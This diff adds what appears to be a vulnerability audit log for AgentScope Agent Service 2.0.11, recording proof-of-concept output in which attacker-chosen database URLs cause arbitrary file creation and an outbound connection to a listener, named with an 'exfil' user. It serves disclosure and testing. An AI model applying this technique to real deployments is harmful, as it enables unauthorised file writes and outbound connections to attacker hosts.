@@ -1,0 +1,32 @@
+AS-2026-004 - AsyncSQLAlchemyStorage SQL-execution surface
+exp_real_api.py - real deployment, unmodified AgentScope Agent Service 2.0.11
+REST traffic only (POST /credential/); no test endpoint, no patched code.
+Transcribed from the original audit run (see screenshots 05, 06, 09, 11).
+
+[0] agentscope :8000 was_running = True
+== A. sqlite+aiosqlite:/// <attacker path> ==
+[A] attacker DB URL = sqlite+aiosqlite:///<attacker %TEMP%>/afuzz_realapi_owned.db
+[A] service ready: True (started with the attacker DB URL)
+[A] POST /credential (real API) -> 201
+[A] attacker-path DB file created: True -> afuzz_realapi_owned.db (in %TEMP%), 12288 bytes
+== B. postgresql+asyncpg://exfil:pw@127.0.0.1:18847/db ==
+[B] attacker DB URL = postgresql+asyncpg://exfil:***@127.0.0.1:18847/db
+[B] startup bytes: 8 b'\x00\x00\x00\x08\x04\xd2\x16/'
+[B] following payload contains SQL: False
+[B] startup plaintext: \x00\x00\x00\x08\x04\xd2\x16/
+== restoring default agentscope :8000 ==
+[restore] default service ready on :8000
+
+[VERDICT] ARBITRARY_DB_PATH_FILE_CREATE = True
+[VERDICT] OUTBOUND_CONNECT_TO_ATTACKER_HOST = True
+[VERDICT] SQL_REACHES_ATTACKER_CONNECTION = False
+[VERDICT] EXP_SUCCESS = True
+
+[note] EXP_SUCCESS is gated on the measured effect (A: a file created at an
+       attacker-chosen path through the unmodified service's own REST API).
+       B is reported as observed: the asyncpg startup packet reached the
+       attacker listener (8 bytes), proving the engine dials the host:port the
+       URL named. SQL_REACHES_ATTACKER_CONNECTION = False because the captured
+       payload was the startup packet only - the fixed PRAGMA rides the SQLite
+       path, not the PostgreSQL handshake. This is stated as measured, not
+       extrapolated.
